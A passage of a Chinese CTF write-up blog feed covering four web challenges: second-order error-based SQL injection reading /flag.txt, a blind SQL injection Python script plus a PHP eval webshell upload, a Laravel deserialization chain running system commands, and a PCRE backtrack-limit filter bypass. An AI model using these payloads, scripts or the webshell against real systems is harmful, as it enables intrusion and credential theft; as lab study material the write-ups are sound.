class="line">&#123;</span><br><span class="line">    $msg = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    $pattern = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    $user_name = $_POST[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    $address = addslashes($_POST[<span class="string">&quot;address&quot;</span>]);</span><br><span class="line">    $phone = $_POST[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;</span><br><span class="line">        $msg = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        $row = $fetch-&gt;fetch_assoc();</span><br><span class="line">        $sql = <span class="string">&quot;update `user` set `address`=&#x27;&quot;</span>.$address.<span class="string">&quot;&#x27;, `old_address`=&#x27;&quot;</span>.$row[<span class="string">&#x27;address&#x27;</span>].<span class="string">&quot;&#x27; where `user_id`=&quot;</span>.$row[<span class="string">&#x27;user_id&#x27;</span>];</span><br><span class="line">        $result = $db-&gt;query($sql);</span><br><span class="line">        <span class="keyword">if</span>(!$result) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg = <span class="string">&quot;订单修改成功&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">&quot;未找到订单!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    $msg = <span class="string">&quot;信息不全&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>$address = addslashes($_POST[&quot;address&quot;]);</code>对修改值进行了转义操作……</p><p>由于报错信息是可以打印出来的，是一个新的知识点：</p><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p><a href="https://blkstone.github.io/2017/11/09/updatexml-sqli/">https://blkstone.github.io/2017/11/09/updatexml-sqli/</a></p><p>利用updatexml的中间不合语法的参数报错带出数据</p><p>至于二次注入，很多wp都没解释……我猜测一波……</p><p>在更新数据时，虽然对修改值进行了转义操作，但不会将<code>\</code>带入数据库，拿出时仍是<code>&#39;</code>。</p><p><code>$row = $fetch-&gt;fetch_assoc();</code>抓取的是上一次的数据</p><p>“‘, `old_address`=’”.$row[‘address’]是上一次的address，这使得 <strong>‘</strong> 依然起效……</p><p>我们先注入报错语句，再在change随便更改下，上次注入语句便开始工作，获得报错内容，带出数据。</p><p>构造语句使符合语法进行报错注入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">address&#x3D;1&#39; where user_id&#x3D;updatexml(1,concat(0x7e,(select(database())),0x7e),1)#</span><br><span class="line"></span><br><span class="line">address&#x3D;1&#39; where user_id&#x3D;updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database())),0x7e),1)#</span><br><span class="line"></span><br><span class="line">address&#x3D;1&#39; where user_id&#x3D;updatexml(1,concat(0x7e,substr((select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;0x75736572)),20,30),0x7e),1)#</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>查了一大波东西，似乎没有flag……?</p><p>原题目好像告诉了要读根目录的flag.txt……</p><p><code>address=1&#39; where user_id=updatexml(1,concat(0x7e,substr(load_file(&#39;/flag.txt&#39;),1,20),0x7e),1)#</code></p><img src="/images/CISCN2019-华北赛区-Day1-Web5-CyberPunk/image-20210423190458532.png" alt="image-20210423190458532" style="zoom:80%;" /><p><code>address=1&#39; where user_id=updatexml(1,concat(0x7e,substr(load_file(&#39;/flag.txt&#39;),20,60),0x7e),1)#</code></p><p>flag{db0fd1ea-0731-4</p><p>b94-ad41-e7e6192643eb}</p><p>得到了flag……</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;CISCN2019-华北赛区-Day1-Web5-CyberPunk&quot;&gt;&lt;a href=&quot;#CISCN2019-华北赛区-Day1-Web5-CyberPunk&quot; class=&quot;headerlink&quot; title=&quot;[CISCN2019 华北赛区 Day1 Web</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>CISCN2019-总决赛-Day2-Web1-Easyweb</title>
    <link href="http://example.com/2021/04/23/CISCN2019-%E6%80%BB%E5%86%B3%E8%B5%9B-Day2-Web1-Easyweb/"/>
    <id>http://example.com/2021/04/23/CISCN2019-%E6%80%BB%E5%86%B3%E8%B5%9B-Day2-Web1-Easyweb/</id>
    <published>2021-04-23T02:56:01.000Z</published>
    <updated>2021-04-23T14:38:19.416Z</updated>
    
    <content type="html"><![CDATA[<h3 id="CISCN2019-总决赛-Day2-Web1-Easyweb"><a href="#CISCN2019-总决赛-Day2-Web1-Easyweb" class="headerlink" title="[CISCN2019 总决赛 Day2 Web1]Easyweb"></a>[CISCN2019 总决赛 Day2 Web1]Easyweb</h3><p>进入题目是一个登录界面：</p><img src="/images/CISCN2019-总决赛-Day2-Web1-Easyweb/image-20210423105739857.png" alt="image-20210423105739857" style="zoom:40%;" /><p>其中每次登录猫猫的图片会发生变化</p><p>查看robots.txt有所发现：</p><p><code>User-agent: * Disallow: *.php.bak</code></p><p>说明存在以.php.bak结尾的源码备份……但尝试一下发现不是index，也不是users……难道要爆破……</p><p>查看源码发现：</p><p><code>&lt;div class=&quot;avtar&quot;&gt;&lt;img src=&quot;image.php?id=2&quot; width=&quot;200&quot; height=&quot;200&quot;/&gt;&lt;/div&gt;</code></p><p>存在image.php……</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">$id=<span class="keyword">isset</span>($_GET[<span class="string">&quot;id&quot;</span>])?$_GET[<span class="string">&quot;id&quot;</span>]:<span class="string">&quot;1&quot;</span>;</span><br><span class="line">$path=<span class="keyword">isset</span>($_GET[<span class="string">&quot;path&quot;</span>])?$_GET[<span class="string">&quot;path&quot;</span>]:<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">$id=addslashes($id);</span><br><span class="line">$path=addslashes($path);</span><br><span class="line"></span><br><span class="line">$id=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,$id);</span><br><span class="line">$path=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,$path);</span><br><span class="line"></span><br><span class="line">$result=mysqli_query($con,<span class="string">&quot;select * from images where id=&#x27;<span class="subst">&#123;$id&#125;</span>&#x27; or path=&#x27;<span class="subst">&#123;$path&#125;</span>&#x27;&quot;</span>);</span><br><span class="line">$row=mysqli_fetch_array($result,MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line">$path=<span class="string">&quot;./&quot;</span> . $row[<span class="string">&quot;path&quot;</span>];</span><br><span class="line">header(<span class="string">&quot;Content-Type: image/jpeg&quot;</span>);</span><br><span class="line">readfile($path);</span><br></pre></td></tr></table></figure><blockquote><p>PHP addslashes() 函数</p><p>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。</p><p>预定义字符是：</p><ul><li>单引号（’）</li><li>双引号（”）</li><li>反斜杠（\）</li><li>NULL</li></ul></blockquote><p><code>&#39;</code>会被转义掉，但配合str_replace就可以产生一些奇妙的变化</p><p><code>?id=\0</code>：<img src="/images/CISCN2019-%E6%80%BB%E5%86%B3%E8%B5%9B-Day2-Web1-Easyweb/image-20210423115233354.png" alt="image-20210423115233354"></p><p>这样就可以传入一个转义符号，类似Hgame2021的jali，转义掉一个<code>&#39;</code>，注释掉一个<code>&#39;</code>来注入</p><p><code>?id=\\0&amp;path=or 1=1%23</code>即为：</p><p><code>select * from images where id=&#39;\&#39; or path=&#39;or 1=1#&#39;</code>=&gt;</p><p> =&gt; select * from images where id=’<u><strong><em>\‘ or path=’</em></strong></u>or 1=1#’               </p><p> =&gt; select * from images where id=’xxx’or 1=1#’</p><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">url1 = <span class="string">&quot;http://3c46950f-801d-4706-8c49-8e6974909d4c.node3.buuoj.cn/image.php?id=\\0&amp;path=or if(ord(substr(database(),&#123;&#125;,1))&gt;=&#123;&#125;,1,0)%23&quot;</span></span><br><span class="line"><span class="comment"># 库名</span></span><br><span class="line">url2 = <span class="string">&quot;http://3c46950f-801d-4706-8c49-8e6974909d4c.node3.buuoj.cn/image.php?id=\\0&amp;path=or &quot;</span> \</span><br><span class="line">       <span class="string">&quot;if(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),&#123;&#125;,1))&gt;=&#123;&#125;,1,0)%23&quot;</span></span><br><span class="line"><span class="comment"># 表名</span></span><br><span class="line">url3 = <span class="string">&quot;http://3c46950f-801d-4706-8c49-8e6974909d4c.node3.buuoj.cn/image.php?id=\\0&amp;path=or &quot;</span> \</span><br><span class="line">       <span class="string">&quot;if(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=0x7573657273)),&#123;&#125;,1))&gt;=&#123;&#125;,1,0)%23&quot;</span></span><br><span class="line"><span class="comment"># 列名，因为不能用单引号，使用16进制代替。</span></span><br><span class="line">url4 = <span class="string">&quot;http://3c46950f-801d-4706-8c49-8e6974909d4c.node3.buuoj.cn/image.php?id=\\0&amp;path=or &quot;</span> \</span><br><span class="line">       <span class="string">&quot;if(ord(substr((select(password)from(users)),&#123;&#125;,1))&gt;=&#123;&#125;,1,0)%23&quot;</span></span><br><span class="line"><span class="comment"># 数据</span></span><br><span class="line">url = url4</span><br><span class="line"><span class="comment"># 选择查询语句</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    l = <span class="number">32</span></span><br><span class="line">    r = <span class="number">126</span></span><br><span class="line">    <span class="keyword">while</span> r &gt; l:</span><br><span class="line">        mid = <span class="built_in">int</span>((l + r + <span class="number">1</span>) / <span class="number">2</span>)</span><br><span class="line">        x = <span class="built_in">str</span>(x)</span><br><span class="line">        y = <span class="built_in">str</span>(mid)</span><br><span class="line">        pay = url.<span class="built_in">format</span>(x, y)</span><br><span class="line">        response = requests.get(url=pay)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;JFIF&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            l = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r = mid - <span class="number">1</span></span><br><span class="line">        <span class="comment"># time.sleep(0.03)</span></span><br><span class="line">    flag += (<span class="built_in">chr</span>(<span class="built_in">int</span>(r)))</span><br><span class="line">    print(<span class="built_in">chr</span>(<span class="built_in">int</span>(r)))</span><br><span class="line">    print(flag)</span><br><span class="line">print(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>查询结果：    </p><p>库：ciscnfinal</p><p>表：images：id,path</p><p>​        users：   username：admin<br>​                         password ：e957ea7cd1b7147600b8</p><p>找到了admin的账号与密码，登录：</p><img src="/images/CISCN2019-总决赛-Day2-Web1-Easyweb/image-20210423120317916.png" alt="image-20210423120317916" style="zoom:80%;" /><p>user.php是一个上传点……</p><p>上传后会生成提交记录，记录了上传文件名</p><p>e.g：/logs/upload.6274dd38c24268134ba3baabf7c82f0d.log.php</p><img src="/images/CISCN2019-总决赛-Day2-Web1-Easyweb/image-20210423120733203.png" alt="image-20210423120733203" style="zoom:80%;" /><p>上传过滤了php……可以使用短标签：<code>&lt;?=eval($_GET[&#39;a&#39;])?&gt;</code></p><p>测试一下：</p><p>?a=echo 1;</p><img src="/images/CISCN2019-总决赛-Day2-Web1-Easyweb/image-20210423120923447.png" alt="image-20210423120923447" style="zoom:80%;" /><p>成功执行了语句，蚁剑连接，在根目录即可找到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;CISCN2019-总决赛-Day2-Web1-Easyweb&quot;&gt;&lt;a href=&quot;#CISCN2019-总决赛-Day2-Web1-Easyweb&quot; class=&quot;headerlink&quot; title=&quot;[CISCN2019 总决赛 Day2 Web1]Easyw</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>MRctf2021</title>
    <link href="http://example.com/2021/04/18/MRctf2021/"/>
    <id>http://example.com/2021/04/18/MRctf2021/</id>
    <published>2021-04-18T03:28:55.000Z</published>
    <updated>2021-04-18T07:41:27.263Z</updated>
    
    <content type="html"><![CDATA[<h2 id="MRctf2021"><a href="#MRctf2021" class="headerlink" title="MRctf2021"></a>MRctf2021</h2><h3 id="ez-larave1"><a href="#ez-larave1" class="headerlink" title="ez_larave1"></a>ez_larave1</h3><blockquote><p>害……只做出来这一道签到题</p><p>本来以为和20年一样是自己找pop，硬是找不到菜到放弃了，结果一搜搜到个cve……</p></blockquote><p>先找反序列化利用点：</p><p>TaskController.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TaskController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;action&#x27;</span>]) &amp;&amp; preg_match(<span class="string">&#x27;/serialize\/*$/i&#x27;</span>,   $_GET[<span class="string">&#x27;action&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/serialize/i&#x27;</span>, basename(  $_GET[<span class="string">&#x27;action&#x27;</span>])))&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;ser&#x27;</span>]))&#123;</span><br><span class="line">                $ser = $_GET[<span class="string">&#x27;ser&#x27;</span>];</span><br><span class="line">                unserialize($ser);</span><br><span class="line">                <span class="keyword">return</span> ;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;no unserialization&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> ;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>index方法……</p><p>这里学到了，先查询相关框架的路由加载方式，看路由：</p><p><a href="https://laravelacademy.org/post/8731.html">https://laravelacademy.org/post/8731.html</a></p><p>web.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Route::get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> view(<span class="string">&#x27;welcome&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">Route::get(<span class="string">&#x27;/hello&#x27;</span>,<span class="string">&#x27;TaskController@index&#x27;</span>);</span><br></pre></td></tr></table></figure><p>访问/hello时，会加载TaskController类的index方法，这里就是提交点。</p><p>利用方法：cve</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingBroadcast</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">events</span>;</span><br><span class="line">        <span class="keyword">protected</span> $event;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$events=<span class="string">&quot;&quot;</span>,$event=<span class="string">&quot;&quot;</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events = $events;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;event = $event;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Bus</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Dispatcher</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">queueResolver</span> = &quot;<span class="title">system</span>&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">BroadcastEvent</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">connection</span> = &quot;<span class="title">cat</span> /<span class="title">flag</span>&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title">d</span> = <span class="title">new</span> <span class="title">Illuminate</span>\<span class="title">Bus</span>\<span class="title">Dispatcher</span>();</span><br><span class="line">    $b = <span class="keyword">new</span> Illuminate\Broadcasting\BroadcastEvent();</span><br><span class="line">    $p = <span class="keyword">new</span> Illuminate\Broadcasting\PendingBroadcast($d,$b);</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($p));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>菜到直接拿脚本……匹配那个直接 空格+%0a污染即可绕过。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;MRctf2021&quot;&gt;&lt;a href=&quot;#MRctf2021&quot; class=&quot;headerlink&quot; title=&quot;MRctf2021&quot;&gt;&lt;/a&gt;MRctf2021&lt;/h2&gt;&lt;h3 id=&quot;ez-larave1&quot;&gt;&lt;a href=&quot;#ez-larave1&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>FBCTF2019-RCEService</title>
    <link href="http://example.com/2021/04/18/FBCTF2019-RCEService/"/>
    <id>http://example.com/2021/04/18/FBCTF2019-RCEService/</id>
    <published>2021-04-18T02:09:28.000Z</published>
    <updated>2021-04-18T03:25:49.533Z</updated>
    
    <content type="html"><![CDATA[<h3 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h3><img src="/images/FBCTF2019-RCEService/image-20210418101122350.png" alt="image-20210418101122350" style="zoom:80%;" /><p>提交json格式的命令？</p><p>原本题目是提供了源码的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">putenv(<span class="string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">  $json = $_REQUEST[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!is_string($json)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">elseif</span> (preg_match(<span class="string">&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#x27;</span>, $json)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Attempting to run command:&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    $cmd = json_decode($json, <span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> ($cmd !== <span class="literal">NULL</span>) &#123;</span><br><span class="line">      system($cmd);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;Invalid input&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里就是preg_match的两种绕过方法之一 ：PHP利用PCRE回溯次数限制绕过某些安全限制</p><p><a href="https://www.freebuf.com/articles/web/190794.html">https://www.freebuf.com/articles/web/190794.html</a></p><blockquote><p>php采用pcre作为正则表达式库，为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre 设定了一个回溯次数上限 pcre.backtrack_limit。我们可以通过<code>var_dump(ini_get(&#39;pcre.backtrack_limit&#39;));</code>的方式查看当前环境下的上限.</p><p>假设我们的回溯次数超过了 100 万，preg_match返回的非 1 和 0，而是 false。</p></blockquote><p>所以，我们可以利用这个特性使得匹配到的1变为false</p><p>在构造的json数据中构造，若匹配不到，会一步一步回溯：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;ls&quot;,&quot;haha&quot;:&quot;&#x27;</span> + <span class="string">&quot;a&quot;</span>*(<span class="number">1000000</span>) + <span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">res = requests.post(<span class="string">&quot;http://8ccd1800-50a8-437a-b276-5606fc62242c.node3.buuoj.cn/&quot;</span>, data=&#123;<span class="string">&quot;cmd&quot;</span>:payload&#125;)</span><br><span class="line"><span class="keyword">print</span>(res.text)</span><br></pre></td></tr></table></figure><p>因为<code>putenv(&#39;PATH=/home/rceservice/jail&#39;);</code>设置了环境变量，我们需要绝对路径来使用命令</p><blockquote><p>Linux命令的位置：/bin,/usr/bin，默认都是全体用户使用，/sbin,/usr/sbin,默认root用户使用</p></blockquote><p>查proc环境变量查不出来，只能查到cmdline……</p><p>pwd：/var/www/html</p><p>查一下设置的环境变量发现了flag</p><p>cat下即可：/bin/cat /home/rceservice/flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;FBCTF2019-RCEService&quot;&gt;&lt;a href=&quot;#FBCTF2019-RCEService&quot; class=&quot;headerlink&quot; title=&quot;[FBCTF2019]RCEService&quot;&gt;&lt;/a&gt;[FBCTF2019]RCEService&lt;/h3</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>WUSTCTF2020-颜值成绩查询</title>
    <link href="http://example.com/2021/04/16/WUSTCTF2020-%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2/"/>
    <id>http://example.com/2021/04/16/WUSTCTF2020-%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2/</id>
    <published>2021-04-16T09:38:27.000Z</published>
    <updated>2021-04-18T02:08:46.512Z</updated>
    
